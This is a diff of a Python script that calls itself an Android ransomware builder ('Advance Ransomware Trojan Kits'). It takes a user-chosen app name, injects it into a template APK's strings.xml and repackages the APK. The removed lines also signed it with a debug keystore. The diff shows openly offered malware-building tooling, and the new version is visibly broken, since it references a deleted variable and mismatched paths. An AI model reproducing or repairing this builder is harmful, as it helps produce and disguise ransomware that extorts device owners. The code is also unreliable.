@@ -10,18 +10,19 @@ b = "\033[1;34m"
 d = "\033[2;37m"
 R = "\033[1;41m"
 Y = "\033[1;43m"
+gr = "\033[2;37m"
 B = "\033[1;44m"
 w = "\033[0m"
-bold = "\033[1m"
 br = "\033[1;37;41m"
-clear = "\033[1;37;40m"
+bold = "\033[1m"
 
 app_name = ""
 
 def banner():
-    print(f"""
-    {br}{bold} HACKERZ RANSOMWARE BUILDER (BETA){clear} 
-    \t Developed by: Kitty dev\n""")
+	print(f"""{bold}\t ___
+\t|[_]| Advance Ransomware
+\t|+ ;| Trojan Kits - {br} ARTKs {w}
+\t`---'{gr} Developed by: Kitty dev\n""")
 
 def writefile(file,old,new):
     while True:
@@ -39,42 +40,25 @@ def start():
     global app_name
     os.system("clear")
     banner()
-    print(f"{clear}{r}>>{clear} Don't modify the code kiddo :D")
-    ask = str(input(f"{clear}{r}>>{clear} Do you agree (y/n): "+y).lower())
-    if ask in ("yes"): pass
-    else: exit(f"{clear}{r}>>{r} Don't use my tool SKIDD!!! {clear}")
-    print(f"""
-    {br} HACKERZ {w} {bold}is a Advance Android Ransomware Builder tool
-    \t          {br}{bold} BETA TESTING SCRIPT {clear}
-    """)
-    print(w+"-"*43)
     while True:
-        x = str(input(f"{clear}{r}>>{clear} SET app_name: "+y))
+        x = str(input(f"{bold}{r}>>{w} {bold}SET app_name: "+y))
         if len(x) != 0:
             app_name = x
             break
         else: continue
     print(w+"* Building your ransomware APK's ...")
     print(w+"-"*43+d)
-    os.system("apktool d beta.apk")
-    strings = "beta/res/values/strings.xml"
+    os.system("unzip beta.zip")
     print("I: Using strings "+strings)
     smali = os.popen(f"find -L beta/ -name '*0000.smali'","r").readline().strip()
     print("I: Using smali "+os.path.basename(smali))
-    writefile(strings,"appname",app_name)
+    writefile("res/values/strings.xml","appname",app_name)
+    print("I: Adding name with "+app_name)
     time.sleep(3)
-    os.system("apktool b beta -o final.apk;rm -rf beta")
-    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
-    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
-    os.system("rm -rf final.apk")
-    if os.path.isfile("final-aligned-signed.apk"):
-        out = app_name.replace(" ","").lower() + ".apk"
-        os.system("mv final-aligned-signed.apk "+out)
-        getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
-    else: print(r+"[!]"+w+" Failed to signed APK's")
+    os.system("zip final.apk resources.arsc classes.dex AndroidManifest.xml res org META-INF")
 
 if __name__ == "__main__":
     try:
         start()
     except KeyboardInterrupt:
-        exit(r+"\n[!]"+w+" Thanks for Using this tools :D")
+        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    Join Us All \033[4mhttps://bit.ly/3PV3S3r/033[0m\n    exiting ...")
